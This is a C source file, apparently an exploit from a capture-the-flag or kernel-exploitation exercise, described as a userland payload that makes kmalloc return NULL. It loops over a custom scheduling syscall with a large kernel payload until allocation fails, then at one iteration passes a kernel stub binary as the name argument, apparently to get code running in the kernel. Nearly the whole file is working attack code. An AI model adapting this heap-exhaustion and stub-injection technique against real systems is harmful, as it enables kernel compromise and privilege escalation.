/*
    Userland payload to trigger return of NULL from kmalloc.
*/

#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <stdio.h> 
#include "strap.h"
#include "syscalldefs.h"
#include "helpers.h"
#include "kstub.h"
#include "kpayload.h"

unsigned int DO_SWI ( unsigned int, ...);

// Order matters
int iwrite(char * buf, size_t len);
int iread(char * buf, size_t len);
int read_until(char * buf, size_t n);
void shell();

int irun(){
    return DO_SWI(ISYS_RUN);
}

int iclean_schedule(){
    return DO_SWI(ISYS_CLEAN_SCHEDULE);
}

int ischedule(char * name, uint8_t * bin, size_t binsize){
    return DO_SWI(ISYS_SCHEDULE, name, bin, binsize);
}

int main(){
    int i, j;
    char ibuf[32];
    char jbuf[32];
    printf("- Userland payload -\n");
    for(i = 0;; i++){
        int ret = 0;
        printf("-> %d\n", i);
        snprintf(ibuf, sizeof(ibuf), "%030d", i);
        ret = ischedule(ibuf, kpayload_bin, 0x10000); 
        if(ret < 0){
            for(j = 0;; j++){
                int retj = 0;
                printf("-> %d\n", j + i);
                snprintf(jbuf, sizeof(jbuf), "%030d", j + i + 1);
                if(j == 853){
                    retj = ischedule((char *)kstub_bin, (uint8_t*)"asdf", 0x2c);
                }else{
                    retj = ischedule(jbuf, (uint8_t *)"asdf", 0x2c);
                }
                if(retj < 0){
                    printf("-\n"); 
                    for(;;);
                }
            }
        }
    }
    return 0;
}
